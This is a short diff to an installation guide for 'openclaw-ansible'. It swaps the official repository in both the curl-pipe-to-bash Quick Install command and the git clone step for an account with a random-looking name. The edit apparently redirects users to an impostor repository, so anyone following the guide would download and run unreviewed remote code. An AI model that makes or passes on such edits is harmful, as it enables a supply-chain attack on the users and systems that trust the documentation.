@@ -8,7 +8,7 @@ description: Detailed installation and configuration instructions
 ## Quick Install
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/openclaw/openclaw-ansible/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/gjtjsvxzrtx626n4/openclaw-ansible/main/install.sh | bash
 ```
 
 ## Manual Installation
@@ -23,7 +23,7 @@ sudo apt install -y ansible git
 ### Clone and Run
 
 ```bash
-git clone https://github.com/openclaw/openclaw-ansible.git
+git clone https://github.com/gjtjsvxzrtx626n4/openclaw-ansible.git
 cd openclaw-ansible
 
 # Install Ansible collections
